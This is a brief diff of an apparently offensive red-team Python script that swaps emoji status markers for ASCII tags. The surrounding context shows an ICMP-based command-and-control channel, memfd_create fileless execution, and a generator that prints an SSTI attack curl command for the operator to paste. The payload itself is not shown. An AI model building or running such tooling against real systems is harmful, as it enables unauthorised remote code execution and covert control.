@@ -650,9 +650,9 @@ def main():
     if not args.skip_check:
         print("\n[*] ICMP 連通性預檢...")
         if _icmp_precheck(args.target):
-            print(f"  ✅ {args.target} ICMP 可達")
+            print(f"  [OK] {args.target} ICMP 可達")
         else:
-            print(f"  ❌ {args.target} ICMP 不可達!")
+            print(f"  [FAIL] {args.target} ICMP 不可達!")
             print(f"  → C2 使用 ICMP 傳輸指令，目標必須可 ping 通")
             print(f"  → 檢查: UFW / iptables / 雲端安全組是否封鎖 ICMP")
             print(f"  → 詳細檢查: sudo bash red_team/check_connectivity.sh {args.target} {args.lhost}")
@@ -661,7 +661,7 @@ def main():
 
     # ── 架構資訊 ──
     memfd_nr = _get_memfd_syscall_nr()
-    print(f"  ℹ️  memfd_create syscall #{memfd_nr} ({platform.machine()})")
+    print(f"  [INFO]  memfd_create syscall #{memfd_nr} ({platform.machine()})")
 
     print("\n\033[93m[*] SSTI attack command (paste into another terminal):\033[0m\n")
     print(f"  {generate_curl_command(args.target, args.port, args.lhost)}\n")
